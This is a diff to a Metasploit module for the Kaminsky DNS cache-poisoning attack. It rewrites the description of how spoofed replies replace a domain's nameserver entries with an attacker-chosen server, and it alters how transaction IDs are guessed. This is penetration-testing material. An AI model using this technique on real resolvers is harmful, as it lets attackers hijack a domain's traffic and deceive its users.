@@ -14,16 +14,13 @@ class Auxiliary::Spoof::Dns::BailiWickedDomain < Msf::Auxiliary
 			'Name'           => 'DNS BailiWicked Domain Attack',
 			'Description'    => %q{
 				This exploit attacks a fairly ubiquitous flaw in DNS implementations which 
-				Dan Kaminsky found and disclosed ~Jul 2008.  This exploit caches a
-				malicious host entry into the target nameserver for each authoritative
-				nameserver for the target domain by sending random sub-domain queries
-				to the target DNS server coupled with spoofed replies to those queries
-				from the authoritative nameservers for the domain which contain a malicious
-				host entry for the hostname to be poisoned in the authority and additional
-				records sections.  Eventually, a guessed ID will match and the spoofed
-				packet will get accepted, and due to the additional hostname entry being
-				within bailiwick constraints of the original request the malicious host
-				entry will get cached.
+				Dan Kaminsky found and disclosed ~Jul 2008.  This exploit replaces the target
+				domains nameserver entries in a vulnerable DNS cache server. This attack works
+				by sending random hostname queries to the target DNS server coupled with spoofed
+				replies to those queries from the authoritative nameservers for that domain.
+				Eventually, a guessed ID will match, the spoofed packet will get accepted, and
+				the nameserver entries for the target domain will be replaced by the server
+				specified in the NEWDNS option of this exploit.
 			},
 			'Author'         => [ 'I)ruid', 'hdm' ],
 			'License'        => MSF_LICENSE,
@@ -123,7 +120,7 @@ class Auxiliary::Spoof::Dns::BailiWickedDomain < Msf::Auxiliary
 		recons  = datastore['RECONS']
 		xids    = datastore['XIDS'].to_i
 		newttl  = datastore['TTL'].to_i
-		xidbase = rand(65536-xids)
+		xidbase = rand(20001) + 20000
 		
 		address = Rex::Text.rand_text(4).unpack("C4").join(".")
 
@@ -157,8 +154,6 @@ class Auxiliary::Spoof::Dns::BailiWickedDomain < Msf::Auxiliary
 				end
 			end
 		end
-
-
 
 		# Verify its not already poisoned
 		begin
